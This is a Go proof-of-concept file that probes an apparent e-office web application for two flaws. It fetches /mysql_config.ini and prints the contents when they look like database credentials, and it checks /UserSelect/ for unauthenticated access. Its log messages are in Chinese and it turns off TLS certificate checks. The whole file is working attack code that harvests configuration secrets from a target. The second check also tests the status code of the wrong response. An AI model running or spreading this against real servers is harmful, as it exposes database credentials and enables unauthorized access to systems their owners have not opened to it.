package poc

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"
)

func EOfficeVUl(target string) {
	url := strings.TrimRight(target, "/")
	reqconf, err := http.NewRequest("GET", url+"/mysql_config.ini", nil)
	if err != nil {
		log.Println("[-] 请求异常:", err)
		return
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
	responseconf, err := client.Do(reqconf)
	if err != nil {
		log.Println("[-] 请求失败:", err)
		return
	}
	defer responseconf.Body.Close()

	// 读取响应内容
	respconfBody, err := io.ReadAll(responseconf.Body)

	tag := regexp.MustCompile("datauser").MatchString(string(respconfBody))
	if responseconf.StatusCode == http.StatusOK && tag {
		log.Println("[+] 存在数据库配置文件泄露：")
		fmt.Println(string(respconfBody))
	} else {
		log.Println("[-] 不存在数据库配置文件泄露")
	}

	request, err := http.NewRequest("GET", url+"/UserSelect/", nil)
	if err != nil {
		log.Println("[-] 请求异常:", err)
		return
	}

	response, err := client.Do(request)
	if err != nil {
		log.Println("[-] 请求失败:", err)
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	responseBody, err := io.ReadAll(response.Body)
	tag1 := regexp.MustCompile("选择人员").MatchString(string(responseBody))
	if responseconf.StatusCode == http.StatusOK && tag1 {
		log.Println("[+] 存在未授权漏洞，请访问：", url+"/UserSelect/")
	} else {
		log.Println("[-] 不存在未授权漏洞")
	}
}
